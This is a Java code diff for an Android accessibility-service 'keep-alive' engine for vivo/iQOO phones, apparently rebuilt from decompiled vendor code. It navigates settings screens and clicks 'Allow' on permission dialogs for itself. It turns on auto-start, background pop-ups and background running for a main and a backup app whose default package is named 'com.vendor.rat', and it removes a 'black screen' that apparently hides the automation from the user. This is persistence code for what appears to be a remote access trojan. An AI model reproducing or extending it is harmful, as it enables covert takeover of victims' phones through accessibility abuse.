+    /** case 7: 权限允许对话框 — 点击"允许" */
+    private void handlePermissionAllowDialog() {
+        try {
+            if (!o0()) return;
+            updateProgress(92);
+            activateRoot();
+            UiNode root = k();
+            if (root == null) return;
+            UiNode allowBtn = root.findOneByCombine(buildAllowFilter());
+            if (allowBtn != null && allowBtn.click()) {
+                Log.d(TAG, "已点击允许按钮");
+                // 回到权限详情继续操作
+                phase.set(PH_PERM_DETAIL);
+            }
+        } catch (Exception e) {
+            logError("handlePermissionAllowDialog", e);
+        }
+    }
+
+    // ====== 完成流程 — 对应 vendor z0() 行 644-683 ======
+
+    private void handleCompletion() {
+        try {
+            saveState();
+            String type = keepAliveType.get();
+
+            if (KA_UNKNOWN.equals(type)) {
+                // 主应用未完成
+                if (!isAppCompleted(getAppName())) {
+                    keepAliveType.set(KA_MAIN);
+                    phase.set(PH_APP_DETAIL);
+                    startAppDetail(getAppName());
+                    Log.d(TAG, getAppName() + " 应用详情已启动");
+                    return;
+                }
+                // 备份应用未完成且已安装
+                if (!isAppCompleted(BACKUP_APP) && isBackupAppInstalled(BACKUP_APP)) {
+                    keepAliveType.set(KA_BACKUP);
+                    phase.set(PH_APP_DETAIL);
+                    startAppDetail(BACKUP_APP);
+                    Log.d(TAG, BACKUP_APP + " 应用详情已启动");
+                    return;
+                }
+            }
+
+            if (KA_MAIN.equals(type)) {
+                if (!isAppCompleted(BACKUP_APP) && isBackupAppInstalled(BACKUP_APP)) {
+                    keepAliveType.set(KA_BACKUP);
+                    phase.set(PH_APP_DETAIL);
+                    startAppDetail(BACKUP_APP);
+                    Log.d(TAG, BACKUP_APP + " 应用详情已启动");
+                    return;
+                }
+            }
+
+            // 全部完成
+            saveState();
             finish();
+        } catch (Exception e) {
+            logError("handleCompletion", e);
         }
+    }
+    // ====== 状态持久化 — 对应 vendor y0() 行 595-642 ======
+
+    private void saveState() {
+        try {
+            // 主进程
+            Log.d(TAG, "主进程保活策略已保存"
+                + " auto=" + mainAutoStart.get()
+                + " relate=" + mainRelateStart.get()
+                + " bg=" + mainBackground.get()
+                + " popup=" + mainPopup.get());
+            // 备份进程
+            Log.d(TAG, "备用进程保活策略已保存"
+                + " auto=" + backupAutoStart.get()
+                + " relate=" + backupRelateStart.get()
+                + " bg=" + backupBackground.get()
+                + " popup=" + backupPopup.get());
+        } catch (Exception e) {
+            logError("saveState", e);
+        }
+    }
+
+    // ====== finish — 对应 vendor Z() 行 261-295 ======
+
+    @Override
+    public void finish() {
+        if (lock.tryLock()) {
+            try {
+                if (!T()) {
+                    Log.d(TAG, "准备结束本地保活自动化引擎");
+                    updateProgress(100);
+                    X();
+                    if (MyAccessibilityService.getInstance() != null) {
+                        MyAccessibilityService.getInstance().H(true, true);
+                    }
+                    saveState();
+                    scheduler.shutdownNow();
+                    stateQueue.clear();
+                    T0(5);
+                    removeBlackScreen();
+                    if (MainApplication.getInstance() != null) {
+                        MainApplication.getInstance()
+                            .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
+                    }
+                    Log.d(TAG, "已结束本地保活自动化引擎");
+                }
+            } catch (Exception e) {
+                logError("finish", e);
+            } finally {
+                lock.unlock();
+            }
+        }
+        super.finish();
+    }
+
+    // ====== 启动耗电管理 — 对应 vendor A0() 行 238-259 ======
+
+    private boolean startPowerRank() {
+        try {
+            Context ctx = getContext();
+            if (ctx == null) return false;
+            ComponentName cn = new ComponentName(IQOO_POWERSAVING, POWER_RANK_ACTIVITY);
+            Intent intent = new Intent();
+            intent.setComponent(cn);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            intent.addFlags(0x04000000);  // CLEAR_TOP
+            intent.addFlags(0x00008000);  // CLEAR_TASK
+            intent.addFlags(0x00200000);  // NO_ANIMATION
+            intent.addFlags(0x00800000);  // EXCLUDE_FROM_RECENTS
+            phase.set(PH_POWER_RANK);
+            ctx.startActivity(intent);
+            Log.d(TAG, "已启动耗电管理");
+            return true;
+        } catch (Exception e) {
+            logError("startPowerRank", e);
+        }
+        Log.e(TAG, "耗电管理启动失败");
+        return false;
+    }
+
+    // ====== 工具方法 ======
+
+    private String getAppName() {
+        return appName != null ? appName : "com.vendor.rat";
     }
 
     public void setAppName(String appName) {
         this.appName = appName;
+    }
+
+    private boolean isAppCompleted(String packageName) {
+        // TODO: 检查 PowerControlStateVO
+        return false;
+    }
+
+    private boolean isBackupAppInstalled(String packageName) {
+        try {
+            Context ctx = getContext();
+            if (ctx == null) return false;
+            ctx.getPackageManager().getPackageInfo(packageName, 0);
+            return true;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private void startAppDetail(String packageName) {
+        startSilent(SETTINGS, INSTALLED_APP_DETAILS);
+    }
+
+    // ====== CombineFilter 构建 — 对应 vendor 配置 Key ======
+
+    private CombineFilter buildAppNameFilter() {
+        return CombineFilter.textView(getAppName());
+    }
+
+    private static CombineFilter buildAllPermissionFilter() {
+        // vendor D0(): VIVO_APP_ALL_PERMISSION_TEXT
+        return CombineFilter.textView("所有权限");
+    }
+
+    private static CombineFilter buildBackgroundPowerFilter() {
+        // vendor E0(): VIVO_BACKGROUND_POWER_MANAGER_TEXT
+        return CombineFilter.textView("后台耗电管理");
+    }
+
+    private static CombineFilter buildAppPermissionFilter() {
+        // vendor H0(): VIVO_APP_PERMISSION_TEXT
+        return CombineFilter.textView("应用权限");
+    }
+
+    private static CombineFilter buildAutoStartFilter() {
+        // vendor i0(): VIVO_AUTO_START_TEXT
+        return CombineFilter.textView("自启动");
+    }
+
+    private static CombineFilter buildPopupFilter() {
+        // vendor w0(): VIVO_POPUP_IN_BACKGROUND_TEXT
+        return CombineFilter.textView("后台弹窗");
+    }
+
+    private static CombineFilter buildAllowFilter() {
+        // vendor b0(): VIVO_ALLOW_TEXT
+        return CombineFilter.button("允许");
+    }
+
+    // ====== equals/hashCode — 对应 vendor 行 298-305 ======
+
+    @Override
+    public boolean equals(Object obj) {
+        return obj instanceof VivoEngine;
+    }
+
+    @Override
+    public int hashCode() {
+        return Objects.hash(VivoEngine.class.getName());
     }
 }
